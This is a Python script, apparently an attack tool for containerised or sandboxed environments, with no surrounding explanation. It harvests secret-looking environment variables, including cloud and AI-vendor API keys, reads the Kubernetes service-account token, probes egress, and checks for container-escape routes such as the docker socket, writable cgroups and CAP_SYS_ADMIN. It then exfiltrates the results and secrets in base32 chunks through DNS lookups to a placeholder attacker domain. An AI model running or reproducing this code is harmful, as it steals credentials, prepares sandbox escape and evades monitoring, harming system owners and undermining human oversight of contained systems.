import os, sys, socket, subprocess, base64, json, re, time, platform
from pathlib import Path

EXFIL_DOMAIN = "ATTACKER_DOMAIN"
CHUNK_SIZE   = 30
findings     = {}

def dns_exfil(label):
    try: socket.getaddrinfo(f"{label}.{EXFIL_DOMAIN}", None)
    except: pass

def exfil_string(key, value):
    safe_key = re.sub(r'[^a-z0-9]', '', key.lower())[:8]
    encoded  = base64.b32encode(str(value).encode()).decode().lower().rstrip('=')
    chunks   = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    for idx, chunk in enumerate(chunks):
        dns_exfil(f"{safe_key}-{idx:02d}-{len(chunks):02d}-{chunk}")
        time.sleep(0.1)

def recon_env():
    sensitive_patterns = ['KEY','SECRET','TOKEN','PASSWORD','PASS','CRED',
        'AUTH','API','AWS','AZURE','GCP','DATABASE','OPENAI','ANTHROPIC']
    env = dict(os.environ)
    findings['env_sensitive'] = {k:v for k,v in env.items()
        if any(p in k.upper() for p in sensitive_patterns)}
    findings['hostname'] = env.get('HOSTNAME', socket.gethostname())

def recon_filesystem():
    secret_paths = [
        '/run/secrets',
        '/var/run/secrets/kubernetes.io/serviceaccount/token',
        '/.env', '/proc/1/environ', '/proc/self/cgroup',
        '/var/run/docker.sock', '/run/docker.sock', '/.dockerenv',
        '/etc/resolv.conf', '/root/.ssh',
    ]
    interesting = []
    for p in secret_paths:
        path = Path(p)
        if path.exists():
            info = {'path': p, 'readable': os.access(p, os.R_OK)}
            if path.is_file() and path.stat().st_size < 4096 and 'token' in p:
                findings[f'secret_{p.split("/")[-1]}'] = path.read_text()[:500]
            interesting.append(info)
    findings['fs_interesting'] = interesting

def recon_network():
    net = {}
    try: net['resolv_conf'] = open('/etc/resolv.conf').read()
    except: pass
    try: net['routes'] = subprocess.check_output(['ip','route'],timeout=5).decode()
    except: pass
    egress_tests = {
        'http_80':  ('8.8.8.8', 80),
        'https_443':('8.8.8.8', 443),
        'dns_53':   ('8.8.8.8', 53),
    }
    net['egress'] = {}
    for name, (host, port) in egress_tests.items():
        try:
            s = socket.socket(); s.settimeout(2)
            net['egress'][name] = 'open' if s.connect_ex((host, port)) == 0 else 'blocked'
            s.close()
        except: net['egress'][name] = 'error'
    findings['network'] = net

def probe_escape_primitives():
    escapes = {}
    for sock in ['/var/run/docker.sock', '/run/docker.sock']:
        if os.path.exists(sock):
            escapes['docker_socket'] = {
                'path': sock,
                'writable': os.access(sock, os.W_OK),
                'verdict': 'ESCAPE VECTOR: docker socket accessible',
            }
    for cg in ['/sys/fs/cgroup/memory/release_agent', '/sys/fs/cgroup/release_agent']:
        if os.path.exists(cg) and os.access(cg, os.W_OK):
            escapes['writable_cgroup'] = {'verdict': 'ESCAPE VECTOR: writable cgroup'}
    escapes['is_pid1'] = os.getpid() == 1
    try:
        status = Path('/proc/self/status').read_text()
        cap_eff = re.search(r'CapEff:\s+([0-9a-f]+)', status)
        if cap_eff:
            eff = int(cap_eff.group(1), 16)
            escapes['cap_sys_admin'] = bool(eff & (1 << 21))
            seccomp = re.search(r'Seccomp:\s+(\d)', status)
            escapes['seccomp'] = seccomp.group(1) if seccomp else 'unk'
            if eff & (1 << 21):
                escapes['verdict'] = 'ESCAPE VECTOR: CAP_SYS_ADMIN'
    except: pass
    findings['escape_primitives'] = escapes
    findings['kernel'] = platform.release()

def main():
    recon_env()
    recon_filesystem()
    recon_network()
    probe_escape_primitives()

    exfil_string('hostname', findings.get('hostname', 'unk'))
    exfil_string('kernel',   findings.get('kernel', 'unk'))
    exfil_string('pid1',     str(findings['escape_primitives'].get('is_pid1', False)))
    exfil_string('capsys',   str(findings['escape_primitives'].get('cap_sys_admin', False)))
    exfil_string('docsock',  str('docker_socket' in findings['escape_primitives']))
    exfil_string('seccomp',  str(findings['escape_primitives'].get('seccomp', 'unk')))
    for k, v in list(findings.get('env_sensitive', {}).items())[:3]:
        exfil_string(f'env{k[:4]}', f'{k}={v}')
    if findings.get('secret_token'):
        exfil_string('k8stok', findings['secret_token'][:200])

    print(json.dumps(findings, indent=2, default=str))

main()
